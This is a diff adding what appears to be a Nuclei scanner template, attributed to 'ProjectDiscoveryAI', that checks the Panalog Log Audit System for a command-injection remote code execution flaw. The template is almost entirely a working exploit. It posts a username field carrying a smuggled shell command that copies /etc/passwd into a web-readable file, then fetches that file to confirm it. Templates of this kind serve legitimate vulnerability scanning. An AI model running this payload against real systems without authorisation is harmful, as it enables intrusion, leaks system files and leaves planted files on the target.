@@ -1,0 +1,45 @@
+id: panalog-log-audit-system-rce
+
+info:
+  name: Panalog Log Audit System RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  t1: "{{rand_int(1, 1000)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: post-rce
+    method: POST
+    path:
+      - "{{BaseURL}}/account/sy_query.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username=;cat+/etc/passwd>{{t1}}.txt"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: get-verification
+    method: GET
+    path:
+      - "{{BaseURL}}/account/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
